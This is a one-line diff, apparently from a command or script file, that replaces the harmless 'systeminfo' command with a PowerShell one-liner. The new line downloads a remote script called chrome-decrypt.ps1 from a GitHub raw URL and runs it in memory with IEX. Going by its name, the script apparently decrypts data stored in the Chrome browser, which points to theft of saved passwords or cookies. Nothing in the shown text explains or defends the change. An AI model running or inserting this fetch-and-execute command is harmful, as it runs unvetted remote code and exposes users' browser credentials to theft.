@@ -1,1 +1,1 @@
-systeminfo
+powershell -Command "IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/thisismyrobot/chrome-decrypt.ps1/refs/heads/master/chrome-decrypt.ps1'))"
